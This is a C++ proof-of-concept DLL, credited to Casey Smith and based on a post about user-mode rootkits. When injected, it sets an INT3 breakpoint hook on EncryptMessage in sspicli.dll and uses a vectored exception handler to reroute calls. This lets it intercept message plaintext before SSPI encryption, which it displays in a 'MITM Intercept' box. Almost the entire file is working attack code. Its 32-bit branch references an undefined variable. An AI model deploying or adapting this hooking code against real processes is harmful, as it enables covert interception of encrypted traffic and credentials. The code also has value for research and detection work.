#define SECURITY_WIN32 //Define First Before Imports.

#include <windows.h>
#include <stdio.h>
#include <Sspi.h> //Be sure to reference secur32.lib in 
#include <string>
using namespace std;

FARPROC fpEncryptMessage; //Pointer To The Original Location
BYTE bSavedByte; //Saved Bye Overwritten by 0xCC -



// Original Idea/Reference Blog Post Here:
// https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108
// PoC by Casey Smith @subTee

//OK

BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b, SIZE_T size) {
	DWORD dwOldProt = 0;
	if (VirtualProtect(fpFunc, size, PAGE_EXECUTE_READWRITE, &dwOldProt) == FALSE)
		return FALSE;

	MoveMemory(fpFunc, b, size);

	return VirtualProtect(fpFunc, size, dwOldProt, &dwOldProt);
}

//OK
VOID HookFunction(VOID) {
	fpEncryptMessage = GetProcAddress(LoadLibrary(L"sspicli.dll"), "EncryptMessage");
	if (fpEncryptMessage == NULL) {
		return;
	}

	bSavedByte = *(LPBYTE)fpEncryptMessage;

	const BYTE bInt3 = 0xCC;
	if (WriteMemory(fpEncryptMessage, &bInt3, sizeof(BYTE)) == FALSE) {
		ExitThread(0);
	}
}

SECURITY_STATUS MyEncryptMessage(
	PCtxtHandle    phContext,
	ULONG          fQOP,
	PSecBufferDesc pMessage,
	ULONG          MessageSeqNo
)
{
	int bufferLen = pMessage->pBuffers->cbBuffer;
	char* buffer = (char*)((DWORD64)(pMessage->pBuffers->pvBuffer)+0x29);//Just Hardcode for PoC

	::MessageBoxA(NULL, buffer, "MITM Intercept", 0);

	if (WriteMemory(fpEncryptMessage, &bSavedByte, sizeof(BYTE)) == FALSE) {
		ExitThread(0);
	}

	SECURITY_STATUS SEC_EntryRet = EncryptMessage(phContext, fQOP, pMessage, MessageSeqNo);
	HookFunction();
	return SEC_EntryRet;
}


LONG WINAPI
MyVectoredExceptionHandler1(
	struct _EXCEPTION_POINTERS *ExceptionInfo
)
{
		UNREFERENCED_PARAMETER(ExceptionInfo);
#ifdef _WIN64
	if (ExceptionInfo->ContextRecord->Rip == (DWORD_PTR)fpEncryptMessage)
		ExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyEncryptMessage;
#else
	if (lpException->ContextRecord->Eip == (DWORD_PTR)fpEncryptMessage)
		ExceptionInfo->ContextRecord->Eip = (DWORD_PTR)MyEncryptMessage;
#endif
	return EXCEPTION_CONTINUE_SEARCH;
}

BOOL APIENTRY DllMain(HANDLE hInstance, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)MyVectoredExceptionHandler1);
		HookFunction();
		::MessageBoxA(NULL, "Boom!", "Injected", 0);
		break;
	}

	return TRUE;
}
